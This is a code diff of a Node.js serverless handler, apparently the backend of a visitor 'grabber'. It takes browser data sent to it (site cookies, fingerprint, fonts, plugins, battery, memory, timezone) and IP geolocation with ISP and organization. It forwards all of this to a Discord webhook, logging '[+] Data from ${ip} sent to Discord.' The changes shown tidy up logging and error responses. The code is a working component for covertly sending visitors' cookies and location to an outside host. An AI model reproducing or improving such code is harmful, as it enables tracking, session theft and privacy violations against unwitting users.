@@ -1,7 +1,9 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    // Only allow POST
+    // Log the request for debugging
+    console.log('Received request:', req.method, req.url);
+
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
@@ -34,7 +36,7 @@ module.exports = async (req, res) => {
             { name: 'Timezone', value: clientData.timezone || 'Unknown', inline: true },
             { name: 'Memory (GB)', value: clientData.memory || 'Unknown', inline: true },
             { name: 'Battery', value: clientData.battery || 'Unknown', inline: true },
-            { name: 'Cookies', value: (clientData.cookies || 'none').substring(0, 200), inline: false },
+            { name: 'Site Cookies', value: (clientData.site_cookies || 'none').substring(0, 200), inline: false },
             { name: 'Plugins', value: (clientData.plugins || 'none').substring(0, 200), inline: false },
             { name: 'Fonts', value: (clientData.fonts || 'none').substring(0, 200), inline: false },
             { name: 'Fingerprint', value: (clientData.fingerprint || 'none').substring(0, 200), inline: false },
@@ -49,12 +51,8 @@ module.exports = async (req, res) => {
         if (geo.lat && geo.lon) {
             embed.fields.push({ name: '🗺️ Map', value: `https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=15`, inline: false });
         }
-        if (geo.isp) {
-            embed.fields.push({ name: 'ISP', value: geo.isp, inline: true });
-        }
-        if (geo.org) {
-            embed.fields.push({ name: 'Organization', value: geo.org, inline: true });
-        }
+        if (geo.isp) embed.fields.push({ name: 'ISP', value: geo.isp, inline: true });
+        if (geo.org) embed.fields.push({ name: 'Organization', value: geo.org, inline: true });
     }
 
     // Send to Discord
@@ -62,9 +60,9 @@ module.exports = async (req, res) => {
     try {
         await axios.post(WEBHOOK_URL, { embeds: [embed] });
         console.log(`[+] Data from ${ip} sent to Discord.`);
+        res.status(200).json({ status: 'ok', message: 'Data sent to webhook' });
     } catch (e) {
         console.error('Webhook error:', e.message);
+        res.status(500).json({ error: 'Webhook failed', details: e.message });
     }
-
-    res.status(200).json({ status: 'ok' });
 };
